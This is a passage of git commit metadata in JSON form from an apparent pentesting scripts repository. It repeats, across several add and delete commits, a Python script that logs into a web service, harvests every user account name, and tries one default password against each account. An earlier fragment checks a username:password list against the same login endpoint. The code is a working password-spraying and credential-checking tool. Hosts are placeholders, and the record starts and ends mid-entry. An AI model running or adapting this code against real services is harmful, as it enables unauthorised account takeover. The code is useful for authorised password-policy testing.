collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    \n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n    \n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\nuserList = sys.argv[1]\n\nwith open(userList) as f:\n    lines = f.readlines()\n\nfor line in lines:\n    username, password = line.split(\" : \")\n    cookie = login(username, password, True)\n    try:\n        switchSession = requests.get('https://[Host]/Services/[Webservice][Method]', cookies=cookie)\n        if switchSession.status_code == 200:\n            print username, password\n    except:\n        if switchSession.status_code == 200:\n            print username, password\n", "source_code_before": null, "methods": [{"name": "login", "start_line": 21, "end_line": 48}], "methods_before": [], "changed_methods": [{"name": "login", "start_line": 21, "end_line": 48}], "nloc": 44, "complexity": 6, "token_count": 303}], "dmm_unit_size": 0.0, "dmm_unit_complexity": 0.0, "dmm_unit_interfacing": 0.0},
    {"hash": "1e972ab6037ad70920e7ddfb66d7560bcdbb4eb6", "msg": "Create test_account_checker.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 17:00:04+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 17:00:04+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["2f1e6db5549379dcf622d0859e7a14e0a8a0dea3"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 84, "lines": 84, "files": 1, "modified_files": [{"old_path": null, "new_path": "test_account_checker.py", "filename": "test_account_checker.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,84 @@\n+# Description\n+# Gets all the in use account names and check if there are some test accounts by checking for a default password\n+\n+# Parameters\n+# Parameter 1: Username of the account to use to get all the account names\n+# Parameter 2: Password of the account to use to get all the account names\n+# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n+\n+# Additional\n+# Replace [Host] with the host\n+# Replace [Post_Value] with the post to retrieve all the users\n+\n+import sys\n+import requests\n+import hashlib\n+import json\n+from collections import namedtuple\n+from os import system\n+import re\n+from multiprocessing.dummy import Pool\n+\n+def login(loginID, password, getCookie = False):\n+    #get challenge\n+    try:\n+        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n+    except:\n+        return login(loginID, password, getCookie)\n+    \n+    s = r.content\n+    s = s[s.index('{'):s.index('}') + 1]\n+    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n+    \n+    #hash password with challenge\n+    hash_dig = password\n+    try:\n+        for i in range(0, x.iterations):\n+            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n+        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n+    except:\n+        print \"[!] Error on loginID\",loginID\n+        return False\n+\n+    try:\n+        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n+    except:\n+        return login(loginID, password, getCookie)\n+\n+    if getCookie:\n+        return r.cookies\n+    return \"true\" in login.content\n+\n+def progress(count, total, suffix = ''):\n+    bar_len = 20\n+    filled_len = int(round(bar_len * count / float(total)))\n+    \n+    percents = round(100.0 * count / float(total), 1)\n+    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n+    \n+    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n+    sys.stdout.flush()\n+\n+\n+loginID = sys.argv[1]\n+password = sys.argv[2]\n+passTry = sys.argv[3]\n+found = 0\n+\n+cookies = login(loginID, password, True)\n+post = '[Post_Value]'\n+users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\n+accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\n+print \"[*]\", len(accounts), \"accounts found\"\n+\n+i = 1\n+for account in accounts:\n+    i = i + 1\n+    if login(account[0], passTry):\n+        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n+        found = found + 1\n+        \n+    #elif login(account[0], account[0]):\n+    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n+    #    found = found + 1\n+    progress(i, len(accounts), found)\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Gets all the in use account names and check if there are some test accounts by checking for a default password"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Username of the account to use to get all the account names"], [6, "# Parameter 2: Password of the account to use to get all the account names"], [7, "# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)"], [8, ""], [9, "# Additional"], [10, "# Replace [Host] with the host"], [11, "# Replace [Post_Value] with the post to retrieve all the users"], [12, ""], [13, "import sys"], [14, "import requests"], [15, "import hashlib"], [16, "import json"], [17, "from collections import namedtuple"], [18, "from os import system"], [19, "import re"], [20, "from multiprocessing.dummy import Pool"], [21, ""], [22, "def login(loginID, password, getCookie = False):"], [23, "    #get challenge"], [24, "    try:"], [25, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [26, "    except:"], [27, "        return login(loginID, password, getCookie)"], [28, ""], [29, "    s = r.content"], [30, "    s = s[s.index('{'):s.index('}') + 1]"], [31, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [32, ""], [33, "    #hash password with challenge"], [34, "    hash_dig = password"], [35, "    try:"], [36, "        for i in range(0, x.iterations):"], [37, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [38, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [39, "    except:"], [40, "        print \"[!] Error on loginID\",loginID"], [41, "        return False"], [42, ""], [43, "    try:"], [44, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [45, "    except:"], [46, "        return login(loginID, password, getCookie)"], [47, ""], [48, "    if getCookie:"], [49, "        return r.cookies"], [50, "    return \"true\" in login.content"], [51, ""], [52, "def progress(count, total, suffix = ''):"], [53, "    bar_len = 20"], [54, "    filled_len = int(round(bar_len * count / float(total)))"], [55, ""], [56, "    percents = round(100.0 * count / float(total), 1)"], [57, "    bar = '=' * filled_len + '-' * (bar_len - filled_len)"], [58, ""], [59, "    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))"], [60, "    sys.stdout.flush()"], [61, ""], [62, ""], [63, "loginID = sys.argv[1]"], [64, "password = sys.argv[2]"], [65, "passTry = sys.argv[3]"], [66, "found = 0"], [67, ""], [68, "cookies = login(loginID, password, True)"], [69, "post = '[Post_Value]'"], [70, "users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})"], [71, "accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)"], [72, "print \"[*]\", len(accounts), \"accounts found\""], [73, ""], [74, "i = 1"], [75, "for account in accounts:"], [76, "    i = i + 1"], [77, "    if login(account[0], passTry):"], [78, "        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])"], [79, "        found = found + 1"], [80, ""], [81, "    #elif login(account[0], account[0]):"], [82, "    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])"], [83, "    #    found = found + 1"], [84, "    progress(i, len(accounts), found)"]], "deleted": []}, "added_lines": 84, "deleted_lines": 0, "source_code": "# Description\n# Gets all the in use account names and check if there are some test accounts by checking for a default password\n\n# Parameters\n# Parameter 1: Username of the account to use to get all the account names\n# Parameter 2: Password of the account to use to get all the account names\n# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n\n# Additional\n# Replace [Host] with the host\n# Replace [Post_Value] with the post to retrieve all the users\n\nimport sys\nimport requests\nimport hashlib\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    \n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    \n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix = ''):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    \n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    \n    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n    sys.stdout.flush()\n\n\nloginID = sys.argv[1]\npassword = sys.argv[2]\npassTry = sys.argv[3]\nfound = 0\n\ncookies = login(loginID, password, True)\npost = '[Post_Value]'\nusers = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\naccounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\nprint \"[*]\", len(accounts), \"accounts found\"\n\ni = 1\nfor account in accounts:\n    i = i + 1\n    if login(account[0], passTry):\n        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n        found = found + 1\n        \n    #elif login(account[0], account[0]):\n    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n    #    found = found + 1\n    progress(i, len(accounts), found)\n", "source_code_before": null, "methods": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "methods_before": [], "changed_methods": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "nloc": 54, "complexity": 7, "token_count": 442}], "dmm_unit_size": 0.23333333333333334, "dmm_unit_complexity": 0.23333333333333334, "dmm_unit_interfacing": 0.0},
    {"hash": "d0323c320304a924f9e9c5983ba7014995c9ede0", "msg": "Delete test_account_checker.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 17:02:05+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 17:02:05+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["1e972ab6037ad70920e7ddfb66d7560bcdbb4eb6"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 84, "insertions": 0, "lines": 84, "files": 1, "modified_files": [{"old_path": "test_account_checker.py", "new_path": null, "filename": "test_account_checker.py", "change_type": "ModificationType.DELETE", "change_type_name": "DELETE", "diff": "@@ -1,84 +0,0 @@\n-# Description\n-# Gets all the in use account names and check if there are some test accounts by checking for a default password\n-\n-# Parameters\n-# Parameter 1: Username of the account to use to get all the account names\n-# Parameter 2: Password of the account to use to get all the account names\n-# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n-\n-# Additional\n-# Replace [Host] with the host\n-# Replace [Post_Value] with the post to retrieve all the users\n-\n-import sys\n-import requests\n-import hashlib\n-import json\n-from collections import namedtuple\n-from os import system\n-import re\n-from multiprocessing.dummy import Pool\n-\n-def login(loginID, password, getCookie = False):\n-    #get challenge\n-    try:\n-        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n-    except:\n-        return login(loginID, password, getCookie)\n-    \n-    s = r.content\n-    s = s[s.index('{'):s.index('}') + 1]\n-    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n-    \n-    #hash password with challenge\n-    hash_dig = password\n-    try:\n-        for i in range(0, x.iterations):\n-            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n-        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n-    except:\n-        print \"[!] Error on loginID\",loginID\n-        return False\n-\n-    try:\n-        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n-    except:\n-        return login(loginID, password, getCookie)\n-\n-    if getCookie:\n-        return r.cookies\n-    return \"true\" in login.content\n-\n-def progress(count, total, suffix = ''):\n-    bar_len = 20\n-    filled_len = int(round(bar_len * count / float(total)))\n-    \n-    percents = round(100.0 * count / float(total), 1)\n-    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n-    \n-    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n-    sys.stdout.flush()\n-\n-\n-loginID = sys.argv[1]\n-password = sys.argv[2]\n-passTry = sys.argv[3]\n-found = 0\n-\n-cookies = login(loginID, password, True)\n-post = '[Post_Value]'\n-users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\n-accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\n-print \"[*]\", len(accounts), \"accounts found\"\n-\n-i = 1\n-for account in accounts:\n-    i = i + 1\n-    if login(account[0], passTry):\n-        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n-        found = found + 1\n-        \n-    #elif login(account[0], account[0]):\n-    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n-    #    found = found + 1\n-    progress(i, len(accounts), found)\n", "diff_parsed": {"added": [], "deleted": [[1, "# Description"], [2, "# Gets all the in use account names and check if there are some test accounts by checking for a default password"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Username of the account to use to get all the account names"], [6, "# Parameter 2: Password of the account to use to get all the account names"], [7, "# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)"], [8, ""], [9, "# Additional"], [10, "# Replace [Host] with the host"], [11, "# Replace [Post_Value] with the post to retrieve all the users"], [12, ""], [13, "import sys"], [14, "import requests"], [15, "import hashlib"], [16, "import json"], [17, "from collections import namedtuple"], [18, "from os import system"], [19, "import re"], [20, "from multiprocessing.dummy import Pool"], [21, ""], [22, "def login(loginID, password, getCookie = False):"], [23, "    #get challenge"], [24, "    try:"], [25, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [26, "    except:"], [27, "        return login(loginID, password, getCookie)"], [28, ""], [29, "    s = r.content"], [30, "    s = s[s.index('{'):s.index('}') + 1]"], [31, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [32, ""], [33, "    #hash password with challenge"], [34, "    hash_dig = password"], [35, "    try:"], [36, "        for i in range(0, x.iterations):"], [37, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [38, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [39, "    except:"], [40, "        print \"[!] Error on loginID\",loginID"], [41, "        return False"], [42, ""], [43, "    try:"], [44, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [45, "    except:"], [46, "        return login(loginID, password, getCookie)"], [47, ""], [48, "    if getCookie:"], [49, "        return r.cookies"], [50, "    return \"true\" in login.content"], [51, ""], [52, "def progress(count, total, suffix = ''):"], [53, "    bar_len = 20"], [54, "    filled_len = int(round(bar_len * count / float(total)))"], [55, ""], [56, "    percents = round(100.0 * count / float(total), 1)"], [57, "    bar = '=' * filled_len + '-' * (bar_len - filled_len)"], [58, ""], [59, "    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))"], [60, "    sys.stdout.flush()"], [61, ""], [62, ""], [63, "loginID = sys.argv[1]"], [64, "password = sys.argv[2]"], [65, "passTry = sys.argv[3]"], [66, "found = 0"], [67, ""], [68, "cookies = login(loginID, password, True)"], [69, "post = '[Post_Value]'"], [70, "users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})"], [71, "accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)"], [72, "print \"[*]\", len(accounts), \"accounts found\""], [73, ""], [74, "i = 1"], [75, "for account in accounts:"], [76, "    i = i + 1"], [77, "    if login(account[0], passTry):"], [78, "        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])"], [79, "        found = found + 1"], [80, ""], [81, "    #elif login(account[0], account[0]):"], [82, "    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])"], [83, "    #    found = found + 1"], [84, "    progress(i, len(accounts), found)"]]}, "added_lines": 0, "deleted_lines": 84, "source_code": null, "source_code_before": "# Description\n# Gets all the in use account names and check if there are some test accounts by checking for a default password\n\n# Parameters\n# Parameter 1: Username of the account to use to get all the account names\n# Parameter 2: Password of the account to use to get all the account names\n# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n\n# Additional\n# Replace [Host] with the host\n# Replace [Post_Value] with the post to retrieve all the users\n\nimport sys\nimport requests\nimport hashlib\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    \n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    \n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix = ''):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    \n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    \n    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n    sys.stdout.flush()\n\n\nloginID = sys.argv[1]\npassword = sys.argv[2]\npassTry = sys.argv[3]\nfound = 0\n\ncookies = login(loginID, password, True)\npost = '[Post_Value]'\nusers = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\naccounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\nprint \"[*]\", len(accounts), \"accounts found\"\n\ni = 1\nfor account in accounts:\n    i = i + 1\n    if login(account[0], passTry):\n        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n        found = found + 1\n        \n    #elif login(account[0], account[0]):\n    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n    #    found = found + 1\n    progress(i, len(accounts), found)\n", "methods": [], "methods_before": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "changed_methods": [{"name": "login", "start_line": 22, "end_line": 50}, {"name": "progress", "start_line": 52, "end_line": 60}], "nloc": null, "complexity": null, "token_count": null}], "dmm_unit_size": 0.7666666666666667, "dmm_unit_complexity": 0.7666666666666667, "dmm_unit_interfacing": 1.0},
    {"hash": "22a8bf739099f42799205e26c85adea5e9fab88c", "msg": "Create test_account_checker.py", "author": {"name": "003random", "email": "003random@protonmail.com"}, "committer": {"name": "GitHub", "email": "noreply@github.com"}, "author_date": "2018-05-16 17:02:21+02:00", "author_timezone": -7200, "committer_date": "2018-05-16 17:02:21+02:00", "committer_timezone": -7200, "branches": "{'master'}", "in_main_branch": true, "merge": false, "parents": ["d0323c320304a924f9e9c5983ba7014995c9ede0"], "project_name": "PyScripts", "project_path": "/Volumes/nVME1T/Py/GitIn/output/temp/003random_all_20250524_145901/c234b37e/c234b37e/c234b37e/PyScripts", "deletions": 0, "insertions": 84, "lines": 84, "files": 1, "modified_files": [{"old_path": null, "new_path": "pentesting/test_account_checker.py", "filename": "test_account_checker.py", "change_type": "ModificationType.ADD", "change_type_name": "ADD", "diff": "@@ -0,0 +1,84 @@\n+# Description\n+# Gets all the in use account names and check if there are some test accounts by checking for a default password\n+\n+# Parameters\n+# Parameter 1: Username of the account to use to get all the account names\n+# Parameter 2: Password of the account to use to get all the account names\n+# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n+\n+# Additional\n+# Replace [Host] with the host\n+# Replace [Post_Value] with the post to retrieve all the users\n+\n+import sys\n+import requests\n+import hashlib\n+import json\n+from collections import namedtuple\n+from os import system\n+import re\n+from multiprocessing.dummy import Pool\n+\n+def login(loginID, password, getCookie = False):\n+    #get challenge\n+    try:\n+        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n+    except:\n+        return login(loginID, password, getCookie)\n+    \n+    s = r.content\n+    s = s[s.index('{'):s.index('}') + 1]\n+    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n+    \n+    #hash password with challenge\n+    hash_dig = password\n+    try:\n+        for i in range(0, x.iterations):\n+            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n+        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n+    except:\n+        print \"[!] Error on loginID\",loginID\n+        return False\n+\n+    try:\n+        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n+    except:\n+        return login(loginID, password, getCookie)\n+\n+    if getCookie:\n+        return r.cookies\n+    return \"true\" in login.content\n+\n+def progress(count, total, suffix = ''):\n+    bar_len = 20\n+    filled_len = int(round(bar_len * count / float(total)))\n+    \n+    percents = round(100.0 * count / float(total), 1)\n+    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n+    \n+    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n+    sys.stdout.flush()\n+\n+\n+loginID = sys.argv[1]\n+password = sys.argv[2]\n+passTry = sys.argv[3]\n+found = 0\n+\n+cookies = login(loginID, password, True)\n+post = '[Post_Value]'\n+users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\n+accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)\n+print \"[*]\", len(accounts), \"accounts found\"\n+\n+i = 1\n+for account in accounts:\n+    i = i + 1\n+    if login(account[0], passTry):\n+        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])\n+        found = found + 1\n+        \n+    #elif login(account[0], account[0]):\n+    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])\n+    #    found = found + 1\n+progress(i, len(accounts), found)\n", "diff_parsed": {"added": [[1, "# Description"], [2, "# Gets all the in use account names and check if there are some test accounts by checking for a default password"], [3, ""], [4, "# Parameters"], [5, "# Parameter 1: Username of the account to use to get all the account names"], [6, "# Parameter 2: Password of the account to use to get all the account names"], [7, "# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)"], [8, ""], [9, "# Additional"], [10, "# Replace [Host] with the host"], [11, "# Replace [Post_Value] with the post to retrieve all the users"], [12, ""], [13, "import sys"], [14, "import requests"], [15, "import hashlib"], [16, "import json"], [17, "from collections import namedtuple"], [18, "from os import system"], [19, "import re"], [20, "from multiprocessing.dummy import Pool"], [21, ""], [22, "def login(loginID, password, getCookie = False):"], [23, "    #get challenge"], [24, "    try:"], [25, "        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)"], [26, "    except:"], [27, "        return login(loginID, password, getCookie)"], [28, ""], [29, "    s = r.content"], [30, "    s = s[s.index('{'):s.index('}') + 1]"], [31, "    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))"], [32, ""], [33, "    #hash password with challenge"], [34, "    hash_dig = password"], [35, "    try:"], [36, "        for i in range(0, x.iterations):"], [37, "            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()"], [38, "        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()"], [39, "    except:"], [40, "        print \"[!] Error on loginID\",loginID"], [41, "        return False"], [42, ""], [43, "    try:"], [44, "        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)"], [45, "    except:"], [46, "        return login(loginID, password, getCookie)"], [47, ""], [48, "    if getCookie:"], [49, "        return r.cookies"], [50, "    return \"true\" in login.content"], [51, ""], [52, "def progress(count, total, suffix = ''):"], [53, "    bar_len = 20"], [54, "    filled_len = int(round(bar_len * count / float(total)))"], [55, ""], [56, "    percents = round(100.0 * count / float(total), 1)"], [57, "    bar = '=' * filled_len + '-' * (bar_len - filled_len)"], [58, ""], [59, "    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))"], [60, "    sys.stdout.flush()"], [61, ""], [62, ""], [63, "loginID = sys.argv[1]"], [64, "password = sys.argv[2]"], [65, "passTry = sys.argv[3]"], [66, "found = 0"], [67, ""], [68, "cookies = login(loginID, password, True)"], [69, "post = '[Post_Value]'"], [70, "users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})"], [71, "accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)"], [72, "print \"[*]\", len(accounts), \"accounts found\""], [73, ""], [74, "i = 1"], [75, "for account in accounts:"], [76, "    i = i + 1"], [77, "    if login(account[0], passTry):"], [78, "        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])"], [79, "        found = found + 1"], [80, ""], [81, "    #elif login(account[0], account[0]):"], [82, "    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])"], [83, "    #    found = found + 1"], [84, "progress(i, len(accounts), found)"]], "deleted": []}, "added_lines": 84, "deleted_lines": 0, "source_code": "# Description\n# Gets all the in use account names and check if there are some test accounts by checking for a default password\n\n# Parameters\n# Parameter 1: Username of the account to use to get all the account names\n# Parameter 2: Password of the account to use to get all the account names\n# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)\n\n# Additional\n# Replace [Host] with the host\n# Replace [Post_Value] with the post to retrieve all the users\n\nimport sys\nimport requests\nimport hashlib\nimport json\nfrom collections import namedtuple\nfrom os import system\nimport re\nfrom multiprocessing.dummy import Pool\n\ndef login(loginID, password, getCookie = False):\n    #get challenge\n    try:\n        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)\n    except:\n        return login(loginID, password, getCookie)\n    \n    s = r.content\n    s = s[s.index('{'):s.index('}') + 1]\n    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))\n    \n    #hash password with challenge\n    hash_dig = password\n    try:\n        for i in range(0, x.iterations):\n            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()\n        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()\n    except:\n        print \"[!] Error on loginID\",loginID\n        return False\n\n    try:\n        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)\n    except:\n        return login(loginID, password, getCookie)\n\n    if getCookie:\n        return r.cookies\n    return \"true\" in login.content\n\ndef progress(count, total, suffix = ''):\n    bar_len = 20\n    filled_len = int(round(bar_len * count / float(total)))\n    \n    percents = round(100.0 * count / float(total), 1)\n    bar = '=' * filled_len + '-' * (bar_len - filled_len)\n    \n    sys.stdout.write('[%s] %s%% [%s]\\r' % (bar, percents, suffix))\n    sys.stdout.flush()\n\n\nloginID = sys.argv[1]\npassword = sys.argv[2]\npassTry = sys.argv[3]\nfound = 0\n\ncookies = login(loginID, password, True)\npost = '[Post_Value]'\nusers = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={\"content-type\":\"text/xml\"})\naccounts = 